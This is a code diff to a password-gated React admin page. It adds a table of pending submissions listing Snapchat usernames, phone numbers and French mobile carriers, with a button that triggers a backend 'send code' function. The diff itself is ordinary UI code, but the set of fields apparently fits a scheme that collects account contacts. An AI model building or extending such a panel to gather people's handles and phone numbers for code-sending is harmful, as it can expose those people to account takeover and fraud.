@@ -1,4 +1,4 @@
-import { useQuery } from "@tanstack/react-query";
+import { useQuery, useQueryClient } from "@tanstack/react-query";
 import { base44 } from "@/api/base44Client";
 import { motion } from "framer-motion";
 import { useState } from "react";
@@ -61,6 +61,9 @@ function PasswordGate({ onUnlock }) {
 export default function Analytics() {
   const [unlocked, setUnlocked] = useState(false);
   const [selectedOperator, setSelectedOperator] = useState(null);
+  const [sendingId, setSendingId] = useState(null);
+  const [sentIds, setSentIds] = useState([]);
+  const queryClient = useQueryClient();
 
   const { data: submissions = [], isLoading: subLoading } = useQuery({
     queryKey: ["submissions"],
@@ -73,6 +76,16 @@ export default function Analytics() {
     queryFn: () => base44.entities.ActionLog.list("-timestamp", 1000),
     enabled: unlocked,
   });
+
+  const handleSendCode = async (id) => {
+    setSendingId(id);
+    try {
+      await base44.functions.invoke("sendCode", { submissionId: id, action: "code_ready" });
+      setSentIds((prev) => [...prev, id]);
+      queryClient.invalidateQueries(["submissions"]);
+    } catch {}
+    setSendingId(null);
+  };
 
   if (!unlocked) return <PasswordGate onUnlock={() => setUnlocked(true)} />;
 
@@ -323,6 +336,77 @@ export default function Analytics() {
             </motion.div>
           )}
         </div>
+
+        {/* Demandes en attente */}
+        {(() => {
+          const pendingSubmissions = submissions.filter(s => s.status === "pending");
+          if (pendingSubmissions.length === 0) return null;
+          return (
+            <motion.div
+              initial={{ opacity: 0 }}
+              animate={{ opacity: 1 }}
+              className="bg-card border border-amber-500/30 rounded-2xl overflow-hidden mb-8"
+            >
+              <div className="px-6 py-4 border-b border-amber-500/20 bg-amber-500/10 flex items-center justify-between">
+                <h3 className="font-heading font-bold text-amber-400 flex items-center gap-2">
+                  <Clock className="w-5 h-5" />
+                  Demandes en attente ({pendingSubmissions.length})
+                </h3>
+              </div>
+              <div className="overflow-x-auto">
+                <table className="w-full text-sm">
+                  <thead>
+                    <tr className="border-b border-border bg-muted/50">
+                      <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Snapchat</th>
+                      <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Téléphone</th>
+                      <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Opérateur</th>
+                      <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Date</th>
+                      <th className="text-left px-6 py-3 text-xs font-semibold uppercase tracking-wider text-muted-foreground">Action</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {pendingSubmissions.map((sub) => {
+                      const isSent = sentIds.includes(sub.id);
+                      const isSending = sendingId === sub.id;
+                      const operatorColors = {
+                        SFR: "bg-red-500/15 text-red-400 border-red-500/30",
+                        Bouygues: "bg-blue-500/15 text-blue-400 border-blue-500/30",
+                        Orange: "bg-orange-400/15 text-orange-400 border-orange-400/30",
+                      };
+                      return (
+                        <tr key={sub.id} className="border-b border-border/50 hover:bg-muted/30 transition-colors">
+                          <td className="px-6 py-3 text-sm font-semibold text-foreground">👻 {sub.snapchat}</td>
+                          <td className="px-6 py-3 text-sm font-mono text-foreground">{sub.telephone}</td>
+                          <td className="px-6 py-3">
+                            <span className={`inline-flex items-center px-2 py-1 rounded-full border text-xs font-bold ${operatorColors[sub.operateur]}`}>
+                              {sub.operateur}
+                            </span>
+                          </td>
+                          <td className="px-6 py-3 text-xs text-muted-foreground">
+                            {new Date(sub.created_date).toLocaleString("fr-FR", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" })}
+                          </td>
+                          <td className="px-6 py-3">
+                            {isSent ? (
+                              <span className="text-green-400 text-xs font-semibold">✅ Code envoyé</span>
+                            ) : (
+                              <button
+                                onClick={() => handleSendCode(sub.id)}
+                                disabled={isSending}
+                                className="bg-primary text-primary-foreground text-xs font-bold px-3 py-1.5 rounded-lg hover:bg-primary/80 transition-colors disabled:opacity-50"
+                              >
+                                {isSending ? "Envoi..." : "📤 Envoyer le code"}
+                              </button>
+                            )}
+                          </td>
+                        </tr>
+                      );
+                    })}
+                  </tbody>
+                </table>
+              </div>
+            </motion.div>
+          );
+        })()}
 
         {/* Action Logs Table */}
         <motion.div
